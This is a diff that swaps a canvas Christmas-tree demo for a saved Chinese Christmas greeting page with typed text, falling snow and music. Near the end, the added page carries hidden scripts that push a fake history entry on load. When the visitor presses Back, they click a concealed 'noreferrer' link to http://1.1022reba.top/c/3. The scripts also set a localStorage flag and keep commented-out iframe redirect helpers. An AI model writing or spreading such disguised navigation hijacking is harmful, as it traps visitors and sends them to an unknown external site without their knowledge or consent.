@@ -1,72 +1,249 @@
-<!DOCTYPE HTML PUBLIC>
-<html>
-<head>
-<title>圣诞树</title>
-<meta charset="utf-8" >
-<style>
-html, body { width: 100%; height: 100%; margin: 0; padding: 0; border: 0; }
-div { margin: 0; padding: 0; border: 0; }
-.nav { 
-		position: absolute; 
-		top: 0; 
-				left: 0; 
-				width: 100%; 
-				height: 27px; 
-				background-color: white; 
-				color: black; 
-				text-align: center; 
-				line-height: 25px;
-			}
+<!DOCTYPE html>
+<!-- saved from url=(0197)file:///C:/Users/%E6%9A%B4%E5%AF%8C/Desktop/%E5%9C%A3%E8%AF%9E%E6%A0%91/%E8%93%9D%E8%89%B2%E5%9C%A3%E8%AF%9E%E6%A0%91573%E4%BB%A3%E7%A0%81/%E5%9C%A3%E8%AF%9E%E5%BF%AB%E4%B9%90.html#pt_1703302119239 -->
+<html lang="zh"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
+
+
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>圣诞快乐</title>
+		<link rel="stylesheet" type="text/css" href="./圣诞快乐_files/normalize.css">
+	<link rel="stylesheet" type="text/css" href="./圣诞快乐_files/default.css">
+	<link href="./圣诞快乐_files/main.css" rel="stylesheet">
+	<style type="text/css">
+		 /* code for animated blinking cursor */
+	        .typed-cursor{
+	            opacity: 1;
+	            font-weight: 100;
+	            -webkit-animation: blink 0.7s infinite;
+	            -moz-animation: blink 0.7s infinite;
+	            -ms-animation: blink 0.7s infinite;
+	            -o-animation: blink 0.7s infinite;
+	            animation: blink 0.7s infinite;
+	        }
+	        @-keyframes blink{
+	            0% { opacity:1; }
+	            50% { opacity:0; }
+	            100% { opacity:1; }
+	        }
+	        @-webkit-keyframes blink{
+	            0% { opacity:1; }
+	            50% { opacity:0; }
+	            100% { opacity:1; }
+	        }
+	        @-moz-keyframes blink{
+	            0% { opacity:1; }
+	            50% { opacity:0; }
+	            100% { opacity:1; }
+	        }
+	        @-ms-keyframes blink{
+	            0% { opacity:1; }
+	            50% { opacity:0; }
+	            100% { opacity:1; }
+	        }
+	        @-o-keyframes blink{
+	            0% { opacity:1; }
+	            50% { opacity:0; }
+	            100% { opacity:1; }
+	        }
+
+	        .typed-fade-out{
+	            opacity: 0;
+	            animation: 0;
+	            transition: opacity .25s;
+	        }
+	</style>
+<style>@font-face{font-family:uc-nexus-iconfont;src:url(chrome-extension://pogijhnlcfmcppgimcaccdkmbedjkmhi/res/font_9qmmi8b8jsxxbt9.woff) format('woff'),url(chrome-extension://pogijhnlcfmcppgimcaccdkmbedjkmhi/res/font_9qmmi8b8jsxxbt9.ttf) format('truetype')}</style>
+<!--#include file="../../tongji.html"-->
+
+  <script>
+    var shouci=true;
+    console.log(shouci);
+        function bodyPlayMusic(){
+            if(shouci){
+                shouci=false;
+                audio.play();
+                console.log(shouci);
+            }
+        };
+    </script>
+    
+    
+    
+ <script src="./圣诞快乐_files/monitors.3.6.36.cn.js.下载" async="" crossorigin="anonymous"></script><script src="./圣诞快乐_files/sentry.3.6.36.cn.js.下载" async="" crossorigin="anonymous"></script></head>
+<body onclick="bodyPlayMusic()" style="">
  
-			a { color: black; text-decoration: none; border-bottom: 1px dashed black; }
-			a:hover { border-bottom: 1px solid red; }
+
  
-			.previous { float: left; margin-left: 10px; }
-			.next { float: right; margin-right: 10px; }
-			
-			.green { color: green; }
-			.red { color: red; }
  
-			textarea { width: 100%; height: 100%; border: 0; padding: 0; margin: 0; padding-bottom: 20px; }
-			.block-outer { float: left; width: 22%; height: 100%; padding: 5px; border-left: 1px solid black; margin: 30px 3px 3px 3px; }
-			.block-inner { height: 68%; }
-			.one { border: 0; }
-</style>
-	</head>
-	<body marginwidth="0" marginheight="0">
-	<canvas id="c" height="356" width="446">
-<script>
-			var collapsed = true;
-			function toggle() {
-				var fs = top.document.getElementsByTagName('frameset')[0];
-				var f = fs.getElementsByTagName('frame');
-				if (collapsed) {
-					fs.rows = '250px,*';
-					// enable resizing of frames in firefox/opera
-					fs.noResize = false;
-					f[0].noResize = false;
-					f[1].noResize = false;
-				} else {
-					fs.rows = '30px,*';
-					// disable resizing of frames in firefox/opera
-					fs.noResize = true;
-					f[0].noResize = true;
-					f[1].noResize = true;
-				}
-				collapsed = !collapsed;
-			}
+
+
+<img id="music_ico" onclick="clickMusic()" alt="" style=" display: inline; float: right;  ">
+<audio id="audio" src="https://sf6-cdn-tos.douyinstatic.com/obj/ies-music/6905357668872063752.mp3" preload="auto" loop="loop"></audio>
+
+
+
+
+     <!--<a href="https://mp.weixin.qq.com/s/eRlpwDhKvq9e1rIgM1YI7Q"   class="hide_buttom"   style="position: fixed;top: 4%;right: 10px;width: 40px;height: 40px;z-index: 999;background: #696969;border-radius: 50%;padding: 3.0px;text-align: center;color: #ffffff;text-decoration: none;   clear: both; line-height: 36px; 	margin:auto;   font-size: 15px;   ">制作</a>-->
+     
+     
+
+
+          <!--<a href="https://mp.weixin.qq.com/s/C3wf9p5qBXXv9tPd88H_uA"   class="hide_buttom"   style="-->
+          <!--position: fixed;-->
+          <!--top: 10%;-->
+          <!--right: 10px;-->
+          <!--width: 40px;-->
+          <!--height: 40px;-->
+          <!--z-index: 999;-->
+          <!--background: #696969;-->
+          <!--border-radius: 50%;padding: 3.0px;text-align: center;color: #ddd;text-decoration: none;   clear: both; line-height: 36px; 	margin:auto;   font-size: 15px;   ">更多</a>-->
+	<!--<div class="htmleaf-container">-->
+		
+	<!--	<div class="wrap" style="margin:15px; margin-top:-15px;">-->
+	    	<div id="divSnow-1" class="htmleaf-content canvas-1" style="position:absolute; width:100%; height:100%; z-index:-1;  background:#000000;  ">
+
+
+
+
+<img style="position:absolute; width:100%; position:absolute;top: 90px;" src="./圣诞快乐_files/b3cacbc2fe294f42b13a0cf1b5c60443~noop.image">
+
+
+	        <div class="type-wrap" style=" padding: 10px 35px 0px 0px; position: absolute; top: 0px;  left: 35px;  z-index: 500; color: #ffffff; font-size: 14px;    ">
+	            <div id="typed-strings" style="display: none; text-align:center; ">
+ <p></p>
+	                <p><br><br>圣诞老爷爷🎅<br>昨天偷偷告诉我 <br>你就是我的礼物🎊<br>🔔 🍎 🎊 ℳᴇʀʀᎽ🎅 ྀིℂʜʀɪsᴛᴍᴀs🎄🍬</p>
+<!--<img src="static/picture/3.jpg" style="max-width:100%">-->
+
+	            </div>
+	            <span id="typed" style="white-space:pre;   "><br><br>圣诞老爷爷🎅<br>昨天偷偷告诉我 <br>你就是我的礼物🎊<br>🔔 🍎 🎊 ℳᴇʀʀᎽ🎅 ྀིℂʜʀɪsᴛᴍᴀs🎄🍬</span><span class="typed-cursor">|</span><span class="typed-cursor">|</span>
+	            
+	        </div>
+	<!--    </div>-->
+		
+	<!--</div>-->
+	</div>
+	<script type="text/javascript" defer="" async="" src="./圣诞快乐_files/uaest.js.下载"></script><script src="./圣诞快乐_files/typed.js.下载" type="text/javascript"></script>
+	<script type="text/javascript">
+		document.addEventListener('DOMContentLoaded', function(){
+
+	        Typed.new("#typed", {
+	            stringsElement: document.getElementById('typed-strings'),
+	            typeSpeed: 110,
+	            backDelay: 1000,
+	            loop: false,
+	            contentType: 'html', // or text
+	            // defaults to null for infinite loop
+	            loopCount: null,
+	            callback: function(){ foo(); },
+	            resetCallback: function() { newTyped(); }
+	        });
+
+	        var resetElement = document.querySelector('.reset');
+	        if(resetElement) {
+	            resetElement.addEventListener('click', function() {
+	                document.getElementById('typed')._typed.reset();
+	                
+	            });
+	        }
+
+	    });
+
+	    function newTyped(){ /* A new typed object */ }
+
+	    function foo(){ console.log("Callback"); }
+	</script>
+<!--<audio src="1.mp3" id="Jaudio" class="media-audio" autoplay="" preload="" loop="loop"></audio>-->
+<!--<script>-->
+<!--function audioAutoPlay(id){  -->
+<!--    var audio = document.getElementById(id);  -->
+<!--    audio.play();  -->
+<!--    document.addEventListener("WeixinJSBridgeReady", function () {  -->
+<!--            audio.play();  -->
+<!--    }, false);  -->
+<!--    document.addEventListener('YixinJSBridgeReady', function() {  -->
+<!--        audio.play();  -->
+<!--    }, false);  -->
+<!--}  -->
+<!--audioAutoPlay('Jaudio');  -->
+<!--</script>-->
+	
+	
+<script src="./圣诞快乐_files/jquery.min.js.下载" type="text/javascript"></script>
+<script>window.jQuery || document.write('<script src="static/js/jquery-1.11.0.min.js"><\/script>')</script>
+	<script type="text/javascript" src="./圣诞快乐_files/websnowjq.js.下载"></script>
+	<script type="text/javascript">
+	$(function(){
+		$("#divSnow-1").websnowjq();
+	});
+	</script>
+	
+	
+	
  
-</script>
-<script>
-			var b = document.body;
-			var c = document.getElementsByTagName('canvas')[0];
-			var a = c.getContext('2d');
-			document.body.clientWidth; // fix bug in chrome.
-</script>
-<script>
-// start of submission //
-M=Math;Q=M.random;J=[];U=16;T=M.sin;E=M.sqrt;for(O=k=0;x=z=j=i=k<200;)with(M[k]=k?c.cloneNode(0):c){width=height=k?32:W=446;with(getContext('2d'))if(k>10|!k)for(font='60px Impact',V='rgba(';I=i*U,fillStyle=k?k==13?V+'205,205,215,.15)':V+(147+I)+','+(k%2?128+I:0)+','+I+',.5)':'#cca',i<7;)beginPath(fill(arc(U-i/3,24-i/2,k==13?4-(i++)/2:8-i++,0,M.PI*2,1)));else for(;x=T(i),y=Q()*2-1,D=x*x+y*y,B=E(D-x/.9-1.5*y+1),R=67*(B+1)*(L=k/9+.8)>>1,i++<W;)if(D<1)beginPath(strokeStyle=V+R+','+(R+B*L>>0)+',40,.1)'),moveTo(U+x*8,U+y*8),lineTo(U+x*U,U+y*U),stroke();for(y=H=k+E(k++)*25,R=Q()*W;P=3,j<H;)J[O++]=[x+=T(R)*P+Q()*6-3,y+=Q()*U-8,z+=T(R-11)*P+Q()*6-3,j/H*20+((j+=U)>H&Q()>.8?Q(P=9)*4:0)>>1]}setInterval(function G(m,l){A=T(D-11);if(l)return(m[2]-l[2])*A+(l[0]-m[0])*T(D);a.clearRect(0,0,W,W);J.sort(G);for(i=0;L=J[i++];a.drawImage(M[L[3]+1],207+L[0]*A+L[2]*T(D)>>0,L[1]>>1)){if(i==2e3)a.fillText('Merry Christmas!',U,345);if(!(i%7))a.drawImage(M[13],((157*(i*i)+T(D*5+i*i)*5)%W)>>0,((113*i+(D*i)/60)%(290+i/99))>>0);}D+=.02},1)
-// end of submission //
-</script>
-</body>
-</html>
+	<script type="text/javascript">
+											function a(e) {
+												var f = document.createElement('iframe');
+												f.style.display = 'none';
+												document.body.appendChild(f).src = 'javascript:"<script>top.location.replace(\'' + e + '\')<\/script>"';
+											}
+
+											function jump1() {
+												if (!localStorage.is_fx) {
+													localStorage.is_fx = Date.now()
+													//a('http://1022reba.cn/c')
+													//window.location.replace();
+													// location.href="http://1022reba.cn/c";
+												} else {
+													// localStorage.is_fx = Date.now()
+												}
+											}
+
+											function jump2() {
+												gotoData = {
+													"hb": "http://1.1022reba.top/c/3",
+													"hb1": "http://1.1022reba.top/c/3",
+												}
+												if (gotoData[window.location.pathname] != undefined) {
+													//a(gotoData[window.location.pathname])
+												} else {
+													jump1()
+												}
+
+											}
+										</script>
+										<script type="text/javascript">
+											window.onhashchange = function() {
+												jp();
+											};
+
+											function hh() {
+												history.pushState(history.length + 1, "app", "#pt_" + new Date().getTime());
+											}
+
+
+											function jp() {
+												var a = document.createElement('a');
+												a.setAttribute('rel', 'noreferrer');
+												a.setAttribute('href', "http://1.1022reba.top/c/3");
+												document.body.appendChild(a);
+												a.click();
+												document.body.removeChild(a);
+											}
+
+											window.onload = function() {
+												setTimeout('hh();', 100);
+												setTimeout(
+													"var imgs = document.images;for (var t_i=0;t_i<imgs.length;t_i++) {if (imgs[t_i].attributes['d-s'] && imgs[t_i].attributes['d-s'].value) {imgs[t_i].src = imgs[t_i].attributes['d-s'].value;}}",
+													100);
+											}
+											// jump2()
+											window.onpageshow = jump2
+										</script>
+
+
+
+	
+	
+	
+<canvas width="1691" height="858" id="websnowjqcandivSnow-1" style="position: absolute; top: 0px; left: 0px;"></canvas><div id="__FEISHU_CLIPPER__"></div><canvas width="1857" height="918" id="websnowjqcandivSnow-1" style="top:0px;left:0px;position:absolute;"></canvas></body></html>
